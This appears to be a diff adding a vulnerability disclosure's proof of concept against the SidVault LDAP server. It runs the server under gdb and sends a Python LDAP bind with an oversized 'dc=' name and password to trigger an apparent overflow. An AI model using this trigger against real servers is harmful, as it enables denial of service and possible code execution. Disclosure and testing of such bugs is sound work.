@@ -1,0 +1,14 @@
+Proof of concept:
+
+# gdb /usr/local/sidvault/sidvault
+(...)
+(gdb) r -run
+
+In another terminal:
+
+$ cat poc.py
+import ldap
+
+l = ldap.open("localhost")
+l.simple_bind("dc=" + "A"*4099, "B"*256)
+$ ./poc.py
